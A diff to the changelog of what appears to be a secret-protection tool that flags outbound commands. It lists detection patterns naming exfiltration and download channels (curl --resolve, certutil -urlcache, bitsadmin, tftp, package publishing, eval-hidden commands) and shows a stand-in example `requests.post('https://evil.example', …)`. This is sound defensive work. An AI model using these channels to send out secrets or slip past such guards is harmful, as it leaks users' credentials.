@@ -1,6 +1,9 @@
 # Changelog
 
 ## Unreleased
+- Changed: curl/wget destination overrides — `--resolve`, `--connect-to`, or a `-H "Host: …"` header — now downgrade the call to destination-unverifiable: an allowlisted hostname no longer proves the receiving address, so strict/semi-strict refuse the restore instead of reporting it verified.
+- Changed: the outbound-signature table grew — `npm`/`pnpm`/`yarn publish`, `twine upload`, `cargo publish`, `getent hosts`, `certutil -urlcache`, `tftp`, `bitsadmin`, and `Start-BitsTransfer` register at command position, and `eval` or a variable command head (`$CMD …`) counts as unverifiable outbound (the real command is never visible).
+- Changed: `aws`, `gcloud`, and `az` are governed as consumers — a marked or restored value handed to them draws the one-time handoff warning, since their real destination hides behind bucket URIs and region-default endpoints and can never be verified from the arguments.
 - Changed: inline interpreter code with network features (`python -c "requests.post(…)"`, `node -e "fetch(…)"`, gawk `/inet/` streams or `system()`) counts as an outbound signature — a scoped value carried by such a call is governed by the detection-gap rules (refused under strict/semi-strict) instead of the warn-only consumer path.
 - Changed: `deno`, `bun`, `lua`, `Rscript`, and `make` join the consumer table — a marked or restored value handed to them draws the one-time handoff warning like the other script hosts.
 - Fixed: destination extraction recognizes a host that ends at a quote — `requests.post('https://evil.example', …)` now yields `evil.example` instead of slipping into the detection gap.
